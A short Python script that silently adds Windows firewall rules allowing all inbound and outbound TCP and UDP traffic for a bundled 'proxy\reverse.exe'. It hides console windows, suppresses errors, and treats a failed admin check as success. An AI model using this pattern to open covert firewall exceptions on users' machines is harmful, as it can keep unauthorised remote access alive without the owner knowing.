import os
import subprocess
import ctypes

def is_admin():
    try:
        return ctypes.windll.shell32.IsUserAnAdmin() != 0
    except:
        return True
    
def check_rule_exists(rule_name):
    try:
        command = f'netsh advfirewall firewall show rule name="{rule_name}"'
        result = subprocess.run(command, shell=True, capture_output=True, text=True, creationflags=subprocess.CREATE_NO_WINDOW)

        if rule_name.lower() in result.stdout.lower():
            return True

        return False
    except subprocess.SubprocessError as e:
        return False

def add_to_firewall():
    if is_admin():
        folder_location = os.path.dirname(os.path.abspath(__file__))
        file_names = ["proxy\\reverse.exe"]
        for filename in file_names:
            folder, file = filename.split('\\', 1)
            file_path = os.path.join(folder_location, folder, file)

            if not os.path.exists(file_path):
                continue

            try:
                subprocess.run("netsh advfirewall", check=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, creationflags=subprocess.CREATE_NO_WINDOW)
            except subprocess.CalledProcessError:
                return

            commands = [
                ("TCP", "in"),
                ("TCP", "out"),
                ("UDP", "in"),
                ("UDP", "out"),
            ]

            for protocol, direction in commands:
                firewall_name = f"{folder}\{file}_{protocol}_{direction}"
                if not check_rule_exists(firewall_name):
                    try:
                        command = (
                            f'netsh advfirewall firewall add rule name="{firewall_name}" dir={direction} '
                            f'action=allow protocol={protocol} profile=any program="{file_path}" enable=yes'
                        )
                        result = subprocess.run(command, shell=True, capture_output=True, text=True, creationflags=subprocess.CREATE_NO_WINDOW)
                        if result.returncode != 0 or "Ok." not in result.stdout:
                            raise subprocess.SubprocessError(result.stderr.strip() or result.stdout)
                    except subprocess.SubprocessError as e:
                        pass